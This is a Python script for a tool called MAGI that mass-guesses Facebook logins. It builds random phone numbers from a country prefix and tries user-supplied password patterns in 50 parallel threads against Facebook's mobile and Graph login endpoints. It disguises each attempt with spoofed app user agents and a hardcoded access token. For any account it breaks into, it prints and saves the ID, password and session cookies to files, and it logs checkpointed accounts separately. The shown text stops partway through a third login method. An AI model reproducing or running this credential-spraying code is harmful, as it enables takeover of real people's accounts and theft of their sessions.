import os,time,random,string,requests,sys,re,uuid,subprocess,hashlib,secrets
from tqdm import tqdm
import phonenumbers as pn
from phonenumbers import geocoder
from phone_iso3166.country import *
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#os.system("pip install phone_iso3166")
#os.system("pip install phonenumbers")
#[FBAN/FB4A;FBAV/407.0.1.4.41,FBBV/34743134;FBDM/{density=2.0,width=720,height=1406};FBLC/en_US;FBRV/857643267;FBCR/Telenor;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/vivo1907;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]
v_er="Testing"
#=================[COLOR]================#
bl='\u001b[1;30m'
blb='\u001b[30m'
red='\u001b[1;31m'
gr='\u001b[1;32m'
ye='\u001b[1;33m'
blu='\u001b[1;34m'
ma='\u001b[1;35m'
cy='\u001b[1;36m'
wh='\u001b[1;37m'
br='\u001b[0;33m'
reset='\u001b[0m'
rb='\u001b[30;1m'
cc='\033[97;1m'
bgr='\u001b[32m'
B='\033[1;32m'
clrs=['\u001b[1;31m','\u001b[1;32m','\u001b[1;33m','\u001b[1;34m','\u001b[1;35m','\u001b[1;36m','\u001b[1;37m','\u001b[0;33m','\u001b[30;1m','\u001b[32m']
x = random.choice(clrs)
#=================[COLOR]================#
loop = 0
cps = []
oks = []
Cookie = []
user=[]
password = []
#================[LOGO]==============#
simple=f"""
{cc}8b    d8    db     dP°°b8 88 × {red}{v_er}{reset}
{cc}88b  {ye}d88   dPYb{reset}   dP   `° 88
{cc}88YbdP88  dP__Yb  {cy}Yb  °88 88{reset}
{cc}88 YY 88 dP°°°°Yb  YboodP 88
{cy}─────────────────────────────────────────────{reset}
{ye}[×]{reset} {cc}Tool Owner  :  {bgr}MD SAYEM{reset}
{blu}[×]{reset} {cc}Tool Name   :  MAGI :){reset}
{cy}─────────────────────────────────────────────{reset}
[×] Dont Judge {red}Tool{reset} By Its Name !
{cy}─────────────────────────────────────────────{reset}"""

log=f"""{cc}8b    d8    db     dP°°b8 88 × {red}{v_er}{reset}
{cc}88b  {ye}d88   dPYb{reset}   dP   `° 88
{cc}88YbdP88  dP__Yb  {cy}Yb  °88 88{reset}
{cc}88 YY 88 dP°°°°Yb  YboodP 88
{cy}─────────────────────────────────────────────{reset}
{ye}[×]{reset} {cc}Tool Owner  :  {bgr}MD SAYEM{reset}
{blu}[×]{reset} {cc}Tool Name   :  MAGI :){reset}
{cy}─────────────────────────────────────────────{reset}
[×] Dont Judge {red}Tool{reset} By Its Name !
{cy}─────────────────────────────────────────────{reset}
{ye}[1]{cc} Crack file
{blu}[2]{cc} Crack random{reset}
{cy}─────────────────────────────────────────────{reset}"""
#=================[LOGO]===============#

#enable_storage_access()
def pas_wd():
    print(simple)
    hey = input("Input password: ")
    
    if hey == 'sayem':
        pass
    else:
        print("Password incorrect")
        os.system('clear')
        return pas_wd()
#==============[STORAGE]===============#

#==============[STORAGE]===============#
#==================[UA]=================#
def myua():
    phone_models = {
        "Samsung": [
            {"model": "SM-P610", "build": "P610XXS3FWD2"},
            {"model": "SM-T595", "build": "T595XXU4CVG4"},
            {"model": "SM-A107M", "build": "A107MUBS6CWD3"},
            {"model": "SM-A307GT", "build": "A307GTVJS5CWE2"},
            {"model": "SM-G991U", "build": "G991USQS8EWG1"},
            {"model": "SM-G985F", "build": "G985FXXSIHWGA"},
            {"model": "SM-N985F", "build": "N985FXXS7HWG1"},
            {"model": "SM-A515F", "build": "A515FXXU7HWF1"},
            {"model": "SM-A725F", "build": "A725FXXU6DWE3"},
            {"model": "SM-M315F", "build": "M315FXXU3CWA2"},
            {"model": "SM-F916U", "build": "F916USQS2JWE4"}],
        "Other": [
            {"model": "Pixel-5", "build": "G01234"},
            {"model": "iPhone-12", "build": "15A372"},
            {"model": "LG-G8", "build": "V20d"},
            {"model": "OnePlus-9", "build": "OP9XXU1ABC1"},
            {"model": "Xiaomi-Mi11", "build": "MI11XIU2BUC5"}
        ]
    }
    
    mobile_names = [
        "Galaxy", "Nova", "ZenFone", "Nexus", "Razor",
        "Xperia", "Moto", "Pixel", "Lumia", "Redmi"
    ]
    
    brand = random.choice(list(phone_models.keys()))
    model_data = random.choice(phone_models[brand])
    model_ = model_data["model"]
    build = model_data["build"]
    
    os_v = random.randint(4, 13)
    fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
    
    locales = [
        "en_US", "fr_FR", "es_ES", "de_DE", "it_IT",
        "pt_BR", "ru_RU", "zh_CN", "ja_JP"
    ]
    
    locale = random.choice(locales)
    mob = random.choice(mobile_names)
    
    ua = (
        '[FBAN/Orca-Android;FBAV/'
        + str(fbav)
        + ';FBPN/com.facebook.orca;FBLC/'
        + locale
        + ';FBBV/'
        + str(random.randint(111111111, 999999999))
        + ';FBCR/null;FBMF/'
        + mob.lower()
        + ';FBBD/'
        + mob.lower()
        + ';FBDV/'
        + str(model_)
        + '/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]'
    )
    
    return ua

def xXx():
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    build = random.choice(['SKQ1.210216.001', 'RKQ1.211103.002', 'SP1A.210812.016', 'TP1A.220905.001'])
    fbdv = random.choice(["CPH7800", "CPH3818", "CPH4987", "CPH1600"])
    END = f"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{{density={density},width={width},height={height}}};FBLC/en-GB;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{fbdv};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    xXx = 'Davik/2.1.0 (Linux; U; Android '+str(random.randrange(5,12))+'.0.1; '+str(fbdv)+' Build/'+str(build)+') '+END
    return xXx

def jjul_api():
    fban = random.choice(["FB4A"])
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel','JIO','I TIM','AT&amp-T','IND Airtel',])
    fblc = random.choice(["en_US", "en_GB"])
    fbbd = 'OPPO'
    fbpn = random.choice(["com.facebook.katana"])
    fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    fbmf = 'OPPO'
    build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
    fbdv = random.choice(["CPH2481","CPH2375","CPH2335","CPH2301","CPH2283","CPH2457","CPH2429","CPH2431","CPH2387"])

    ua_string = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBRV/0;FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/arm64-v8a:;]"

    return ua_string
    
def R_Ua():
        samsung_models = [
            "SM-P610|P610XXS3FWD2",
            "SM-T595|T595XXU4CVG4",
            "SM-A107M|A107MUBS6CWD3",
            "SM-A307GT|A307GTVJS5CWE2",
            "SM-G991U|G991USQS8EWG1",
            "SM-G985F|G985FXXSIHWGA",
            "SM-N985F|N985FXXS7HWG1",
            "SM-A515F|A515FXXU7HWF1",
            "SM-A725F|A725FXXU6DWE3",
            "SM-M315F|M315FXXU3CWA2",
            "SM-F916U|F916USQS2JWE4",]
        model_,build = random.choice(samsung_models).rsplit('|')
        os_v = random.randint(4, 13)
        fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
        ua = ('[FBAN/Orca-Android;FBAV/'+str(fbav)+';FBPN/com.facebook.orca;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+str(model_)+'/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]')
        return ua


def ua_valid():
    rr = random.randint
    rc = random.choice
    version = random.choice(["6","7","8","9","10","12","13","14"])
    model2 = requests.get('https://raw.githubusercontent.com/MAHADI-XD/MAHADI-GREEN/main/mdls.txt').text.splitlines()
    model = random.choice(model2)
    build = random.choice(["SP1A.210812.016","UKQ1.230804.001","SKQ1.220303.001","TKQ1.221114.001","TKQ1.220829.002","TP1A.220624.014","TKQ1.220905.001","QKQ1.190828.002"])
    redmi4 = f"Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])
#==================[UA]=================#
#=================[MENU]===============#

def menu():
    #os.system('clear')
    #strg_chck()
    #generate_unique_key()
    os.system('clear')
    #pas_wd()
    os.system('clear')
    print(log)
    opt = input(cc + "Choose option: " + reset)
    
    if opt == '1':
        file()
        # os.system('exit')
    elif opt == '2':
        abbu()
    else:
        print(blu + 'CHOOSE THE CORRECT OPTION FROM THE MENU' + reset)
        time.sleep(0.8)
        return menu()




#================[MENU]===============#

#=================[RND]================#
def abbu():
    user = []
    os.system('clear')
    print(simple)
    print(ye + '[!]' + cc + ' With Country Code' + reset)
    ir = input(blu + '[?]' + cc + ' Input the full number of country: ' + bgr)
    kmki = ir
    req = "{}{}{}{}{}{}{}".format(*ir)
    cute = ir[7:]

    try:
        ir = pn.parse(ir)
        sort = phone_country(ir)
    except:
        print(cy + '─────────────────────────────────────────────' + reset)
        print(blu + 'INPUT FULL NUMBER WITH  COUNTRY CODE' + blu)
        print(cy + '─────────────────────────────────────────────' + reset)
        time.sleep(0.9)
        return abbu()

    print(cy + '─────────────────────────────────────────────' + reset)
    print(ye + '[✓]' + cc + ' Country Name Found: ' + bgr + (geocoder.description_for_number(ir, "en")) + '(' + sort + ')')
    print(cy + '─────────────────────────────────────────────' + reset)
    print(blu + '[+]' + cc + ' Example: 2000, 3000 ...' + reset)
    print(cy + '─────────────────────────────────────────────' + reset)
    limit = int(input(ye + "[?]" + cc + " Limit: " + bgr))
    print(cy + '─────────────────────────────────────────────' + reset)
    
    for num in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(int(len(cute))))
        user.append(nmp)

    print(blu + '[+]' + cc + ' EXAMPLE: last6, last7, last8, last9, full' + reset)
    print(cy + '─────────────────────────────────────────────' + reset)
    
    pa_word = int(input(ye + '[+]' + cc + ' How Many Password You Want To Enter: ' + reset))
    print(cy + '─────────────────────────────────────────────' + reset)
    
    password = []
    for cuda in range(pa_word):
        pw_enter = input(f"{B}[{cuda + 1}] {cc}password: {reset}")
        password.append(pw_enter)

    os.system('clear')
    print(simple)
    print(cc + '[1] Method ')
    print(cc + '[2] Method ')
    print(cy + '─────────────────────────────────────────────' + reset)
    
    rn_in = input(cc + '[+] Choose: ')

    with ThreadPool(max_workers=50) as MAGI:
        tl = limit
        os.system("clear")
        print(simple)
        print(cc + '[' + red + '~' + cc + '] Number You Enter: ' + bgr + str(kmki))
        print(cc + '[' + red + '~' + cc + '] Total Accounts: ' + bgr + str(tl) + red + ' || ' + reset + bgr + rn_in)
        print(cc + '[' + red + '~' + cc + '] Airplane For Faster Speed')
        print(cy + '─────────────────────────────────────────────' + reset)

        for magi in user:
            uid = req + magi
            pwx = password
            
            if rn_in == '1':
                MAGI.submit(rcrack1, uid, pwx)
            elif rn_in == '2':
                MAGI.submit(rcrack2, uid, pwx)
            elif rn_in == '3':
                MAGI.submit(rcrack3, uid, pwx)
            else:
                os.system('clear')
                print(simple)
                print(blu + 'PLEASE INPUT THE RIGHT OPTION')

#=================[RND]================#
#wow=random.choice(['[FBAN/FB4A;FBAV/312.0.0.1.114;FBBV/514286074;FBDM/{density=2.75,width=1080,height=2166};FBLC/en_US;FBRV/0;FBCR/NTC;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/78.0.0.6248;FBBV/9698378;[FBAN/FB4A;FBAV/443.0.0.23.229;FBBV/447626277;FBDM/{density=2.25,width=720,height=1280};FBLC/en_NP;FBRV/791484986;FBCR/Nepal Telecom;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Tecno Spark 10 4G;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 9; 5 Build/QP1A.649039.377))[FBAN/FB4A;FBAV/44.0.0.1220;FBBV/6445461;[FBAN/Orca-Android;FBAV/196.0.0.92;FBPN/com.facebook.orca;FBLC/ar_SA;FBBV/272586331;FBCR/1O1Ocsl;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2477;FBSV/13.1.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1080,height=1280};FB_FW/1;FBRV/570217975;]')
#=================[METHOD]================#
def ua_valid():
    rr = random.randint
    rc = random.choice
    version = random.choice(["6","7","8","9","10","12","13","14"])
    model2 = requests.get('https://raw.githubusercontent.com/MAHADI-XD/MAHADI-GREEN/main/mdls.txt').text.splitlines()
    model = random.choice(model2)
    build = random.choice(["SP1A.210812.016","UKQ1.230804.001","SKQ1.220303.001","TKQ1.221114.001","TKQ1.220829.002","TP1A.220624.014","TKQ1.220905.001","QKQ1.190828.002"])
    redmi4 = f"Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])
s__s=random.choice(['[FBAN/FB4A;FBAV/62.0.0.4069;FBBV/4158042[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476335;FBDM/{density=2.0,width=720,height=1358};FBLC/en_US;FBCR/null;FBMF/Pixel;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Pixel 7a;FBSV/13;nullFBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/195.0.0.35.99;FBBV/128710107;FBDM/{density=1.75,width=720,height=1396};FBLC/en_US;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/LT-C3750;FBSV/6;nullFBCA/arm64-v8a:;]'])
def rcrack1(uid, pwx):
    global loop, oks,cps
    noti= random.choice(['\033[31m','\033[32m','\033[33m','\033[34m','\033[35m','\033[36m'])
    sys.stdout.write(f'\r{cc}[<{noti}SAYEM{cc}>] <%s> × <{red}%s{cc}> × <{bgr}%s{cc}>'%(loop,len(cps),len(oks)))
    #print(pwx)
    sys.stdout.flush()
    loop+=1
    try:
        l6 = uid[-6:]
        l7 = uid[-7:]
        l8 = uid[-8:]
        l9 = uid[-9:]
        l10 = uid[-10:]
        l11 = uid[-11:]
        l12 = uid[-12:]
        f6 = uid[3:9]
        f7 = uid[3:10]
        f8 = uid[3:11]
        f9 = uid[3:12]
        f10 = uid[3:13]
        full = uid
        

        for ps in pwx:
            pas = ps.replace('last6', l6).replace('last7', l7).replace('last8', l8).replace('last9', l9).replace('last10', l10).replace('last11', l11).replace('last12', l12).replace('full', full).replace('first6',f6).replace('first7',f7).replace('first8',f8).replace('first9',f9).replace('first10',f10)
            session = requests.Session()
            Oinamamapiliz = session.get('https://x.facebook.com').text
            fucking = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            wanna = {
                'authority': 'x.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'path': '/login/device-based/regular/login/?refsrc',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': '[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281661;FBDM/{density=1.5,width=1920,height=1128};FBLC/en_US;FBRV/0;FBCR/Xudi;FBMF/Quanta;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/QTAIR7;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            }
            
#{"ua":"[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919090;FBDM/{density=1.75,width=720,height=1448};FBLC/en_US;FBRV/385541350;FBCR/Ucom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]"}
#{"ua":"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281684;FBDM/{density=3.5,width=1440,height=2907};FBLC/en_US;FBRV/0;FBCR/AT&amv-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"}
#{"ua":"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"}
#[FBAN/Orca-Android;FBAV/378.0.0.67.84;FBPN/com.facebook.orca;FBLC/en_US;FBBV/366691894;FBCR/3ITA;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10 Lite;FBSV/10;FBCA/x86:armeabi-v7a;FBDM/{density=2.8125,width=1080,height=2208};]|[FBAN/Orca-Android;FBAV/133.0.0.59.88;FBPN/com.facebook.orca;FBLC/en_US;FBBV/310330937;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/X430;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=1920};]'}"
#random.choice(['[FBAN/FB4A;FBAV/62.0.0.4069;FBBV/4158042[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476335;FBDM/{density=2.0,width=720,height=1358};FBLC/en_US;FBCR/null;FBMF/Pixel;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Pixel 7a;FBSV/13;nullFBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/195.0.0.35.99;FBBV/128710107;FBDM/{density=1.75,width=720,height=1396};FBLC/en_US;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/LT-C3750;FBSV/6;nullFBCA/arm64-v8a:;]'])
#Mozilla/5.0 (Linux; Android 7.1.1; Build/LMY47O.H18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]
#Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]
#Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]
#Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]
#Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 [FBAN/FBIOS;FBAV/90.0.0.51.69;FBBV/56254015;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/10.2;FBSS/2;FBCR/1&1;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]
#Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]
#Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]
#nepal = [FBAN/FB4A;FBAV/78.0.0.6248;FBBV/9698378;[FBAN/FB4A;FBAV/443.0.0.23.229;FBBV/447626277;FBDM/{density=2.25,width=720,height=1280};FBLC/en_NP;FBRV/791484986;FBCR/Nepal Telecom;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Tecno Spark 10 4G;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]
#Dalvik/2.1.0 (Linux; U; Android 9; 5 Build/QP1A.649039.377))[FBAN/FB4A;FBAV/44.0.0.1220;FBBV/6445461;[FBAN/Orca-Android;FBAV/196.0.0.92;FBPN/com.facebook.orca;FBLC/ar_SA;FBBV/272586331;FBCR/1O1Ocsl;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2477;FBSV/13.1.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1080,height=1280};FB_FW/1;FBRV/570217975;]            
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc', data=fucking, headers=wanna).text
            acuda = session.cookies.get_dict().keys()
            
            if 'c_user' in acuda:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki.split('c_user=')[1].split(';')[0]
                if uid in oks:
                    pass
                else:
                #coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                #cid = coki[7:22]
                    print(f'\r\r' + bgr + '[MAGI-OK] ' + cid +' | '+ pas)
                    print(bgr + '[BISCUITS] ' + cy + coki)
                #change here
                    open('/sdcard/MAGI-RANDOM-OK.txt', 'a').write(cid + '|' + pas + '\n')
                    open('/sdcard/MAGI-RANDOM-COOKIES-OK.txt', 'a').write(cid + '|' + pas + '|' + coki + '\n')
                    oks.append(uid)
                    break
            elif 'checkpoint' in acuda:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = uid
                print(f'\r\r' + red + '[MAGI-CP] ' + cid +' | '+ pas)
                open('/sdcard/MAGI-RANDOM-CP.txt', 'a').write(cid + '|' + pas + '\n')
                cps.append(uid)
                break
            else:
                continue
                #print(bgr + '[MAGI-OK]' + uid+' | ' + pas)
                #open('magi-ok.txt','a').write(uid + '|' + pas + '\n')  
        #loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
        


######+++++GERE++++#########

def rcrack2(uid, pwx):
    global loop, oks,cps
    noti= random.choice(['\033[31m','\033[32m','\033[33m','\033[34m','\033[35m','\033[36m'])
    sys.stdout.write(f'\r{cc}[<{noti}SAYEM{cc}>] <%s> × <{red}%s{cc}> × <{bgr}%s{cc}>'%(loop,len(cps),len(oks)))
    #print(pwx)
    sys.stdout.flush()
    loop+=1
    try:
        l6 = uid[-6:]
        l7 = uid[-7:]
        l8 = uid[-8:]
        l9 = uid[-9:]
        l10 = uid[-10:]
        l11 = uid[-11:]
        l12 = uid[-12:]
        f6 = uid[3:9]
        f7 = uid[3:10]
        f8 = uid[3:11]
        f9 = uid[3:12]
        f10 = uid[3:13]
        full = uid
        

        for ps in pwx:
            pas = ps.replace('last6', l6).replace('last7', l7).replace('last8', l8).replace('last9', l9).replace('last10', l10).replace('last11', l11).replace('last12', l12).replace('full', full).replace('first6',f6).replace('first7',f7).replace('first8',f8).replace('first9',f9).replace('first10',f10)
            
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            ua = ua_valid()
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            ryzen = ['28', '29', '210']
            dicks = random.choice(ryzen)
            ass = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = dicks + ass
            
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': uid,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
            }
            
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': random.choice(['[FBAN/FB4A;FBAV/62.0.0.4069;FBBV/4158042[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476335;FBDM/{density=2.0,width=720,height=1358};FBLC/en_US;FBCR/null;FBMF/Pixel;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Pixel 7a;FBSV/13;nullFBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/195.0.0.35.99;FBBV/128710107;FBDM/{density=1.75,width=720,height=1396};FBLC/en_US;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/LT-C3750;FBSV/6;nullFBCA/arm64-v8a:;]']),
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }

            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                try:
                    userid = po['userid']
                except:
                    userid = uid
                if str(userid) in oks:
                    break
                else:
                    kuki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                    print(f'\r\r' + bgr + '[MAGI-OK] ' + userid +' | '+ pas)
                    print(bgr + '[BISCUITS] ' + cy + kuki)
                    open('/sdcard/MAGI-RANDOM-OK.txt', 'a').write(str(userid) + '|' + pas + '\n')
                    open('/sdcard/MAGI-RANDOM-COOKIES-OK.txt', 'a').write(str(userid) + '|' + pas + '|' + kuki + '\n')
                    oks.append(str(userid))
                    break

            elif 'www.facebook.com' in po['error']['message']:
                try:
                    userid = po['error']['error_data']['userid']
                except:
                    userid = uid

                if userid in oks:
                    pass
                else:
                    open('/sdcard/MAGI-RANDOM-CP.txt', 'a').write(str(userid) + '|' + pas + '\n')
                    cps.append(str(uid))
                    break
            else:continue
                #print(uid + '|' + pas + '\n')


    except Exception as e:
        pass



def rcrack3(uid, pwx):
    global loop, oks, cps
    noti = random.choice(['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m'])
    sys.stdout.write(f'\r{cc}[<{noti}SAYEM{cc}>] <%s> × <{red}%s{cc}> × <{bgr}%s{cc}>' % (loop, len(cps), len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    ua = ua_valid()
    try:
        l6 = uid[-6:]
        l7 = uid[-7:]
        l8 = uid[-8:]
        l9 = uid[-9:]
        l10 = uid[-10:]
        l11 = uid[-11:]
        l12 = uid[-12:]
        f6 = uid[3:9]
        f7 = uid[3:10]
        f8 = uid[3:11]
        f9 = uid[3:12]
        f10 = uid[3:13]
        full = uid

        for ps in pwx:
            pas = ps.replace('last6', l6).replace('last7', l7).replace('last8', l8).replace('last9', l9).replace(
                'last10', l10).replace('last11', l11).replace('last12', l12).replace('full', full).replace('first6', f6).replace(
                'first7', f7).replace('first8', f8).replace('first9', f9).replace('first10', f10)
            free_fb = session.get('https://free.facebook.com').text
            info = {'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
